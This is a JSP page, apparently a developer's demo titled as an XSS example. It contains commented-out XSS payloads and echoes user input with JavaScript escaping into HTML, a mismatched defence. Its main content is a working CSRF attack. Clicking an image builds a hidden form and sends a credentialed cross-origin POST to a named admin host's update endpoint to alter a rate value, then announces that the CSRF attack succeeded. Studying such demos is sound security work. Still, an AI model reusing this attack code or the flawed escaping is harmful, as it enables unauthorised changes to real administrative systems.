<%@ page language="java" contentType="text/html; charset=UTF-8"
	import="com.baidu.ueditor.ActionEnter"
    pageEncoding="UTF-8"%>
<%@ page trimDirectiveWhitespaces="true" %>
<%@ page import="org.apache.commons.lang.StringEscapeUtils" %>
<%

    request.setCharacterEncoding( "utf-8" );
	response.setHeader("Content-Type" , "text/html");
	
%>

<html>
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
     <title>Xss示例</title>
   </head>


   <body>
      <!-- <script>alert("哈哈，笨蛋！")</script> -->
      <!-- "><script>alert("哈哈，笨蛋！")</script>"<br/ -->
      <!-- ';alert("哈哈，笨蛋！");var x=' -->
      <!--  -->
   
      <form action="/jsp/xss.jsp" method="post">
        <input name="mytext" >
        <input type="submit" value="保存">
      </form>
      
      <div>
        <%
         if(request.getParameter("mytext") != null){
           String mytext = request.getParameter("mytext");
           String text = StringEscapeUtils.escapeJavaScript(mytext);
           pageContext.setAttribute("text", text);
           out.write(text);
         }
        %>
        
        <%-- <input name="mt" value="<%if(pageContext.getAttribute("text") != null){out.write(pageContext.getAttribute("text").toString());}%>"> 
      
        <script type="text/javascript">
          var myvar = '<% if(pageContext.getAttribute("text") != null){out.write(pageContext.getAttribute("text").toString());}%>';
        </script> --%>
        
        
        
        <!-- csrf start-->
        <a href="javascript:void(0);" onclick="csrf();"> 
        <!-- <a href="http://admin-test.baoxianjie.net/upcomm/update.do?pk=11846&icId=2021&prId=&upRate=300&priority=1"> -->
         <img alt="" style="width:300px;height:300px;" src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1498454590963&di=57cc3d8d725d1cd351d3464127ebcbc8&imgtype=0&src=http%3A%2F%2Fimg.taopic.com%2Fuploads%2Fallimg%2F120621%2F201961-120621114H627.jpg" >
        </a>
        <script src="http://admin-test.baoxianjie.net/static/js/jquery.min.js?v=164112"></script>
        <script type="text/javascript">
          function csrf(){
        	  var formId = "form_"+ new Date().getTime();
        	  var formstr = '<form id="'+formId+'" style="display:none">' +
               '<input type="hidden" name="pk" value="11846">' +
               '<input type="hidden" name="icId" value="2021">' +
               '<input type="hidden" name="prId" value="">' +
               '<input type="hidden" name="upRate" value="300">' +
               '<input type="hidden" name="priority" value="1">' +
               '</form>';
              
               $("body").append(formstr);
               
              var formData = new FormData($("#"+formId)[0]);
              $.ajax({
         		      url: 'http://admin-test.baoxianjie.net/upcomm/update.do',  //Server script to process data
         		     // url:'http://agent-dev.baoxianjie.net:8888/wxpay/testcd.do',
         		      type: 'POST',
         		      xhrFields: {
         		        withCredentials: true
         		      },
         		      crossDomain: true,
         		      success: function(data){
         		    	  alert("CSRF攻击成功！");
         		      },
         		      data: formData,
         		      cache: false,
         		      contentType: false,
         		      processData: false
               });  
          }
        	  
          
        </script>
        
      </div>

   </body>
</html>